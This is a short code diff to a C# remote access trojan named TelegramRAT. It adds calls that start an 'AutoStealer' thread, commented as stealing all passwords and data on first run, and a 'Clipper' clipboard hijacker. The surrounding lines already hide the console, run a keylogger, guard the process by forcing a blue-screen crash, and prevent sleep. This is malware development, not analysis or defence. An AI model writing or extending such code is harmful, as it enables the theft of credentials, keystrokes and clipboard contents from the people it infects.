@@ -18,6 +18,7 @@ namespace TelegramRAT
         {
             //Console.ReadLine();
             //Environment.Exit(1);
+
             // Hide console
             persistence.HideConsoleWindow();
             // Mutex check
@@ -42,6 +43,10 @@ namespace TelegramRAT
             persistence.processCheckerThread.Start();
             // Start offline keylogger
             utils.keyloggerThread.Start();
+            // Steal all passwords & data on first start
+            AutoStealer.AutoStealerThread.Start();
+            // Start clipper
+            Clipper.Run();
             // Protect process (BSOD)
             persistence.protectProcess();
             persistence.PreventSleep();
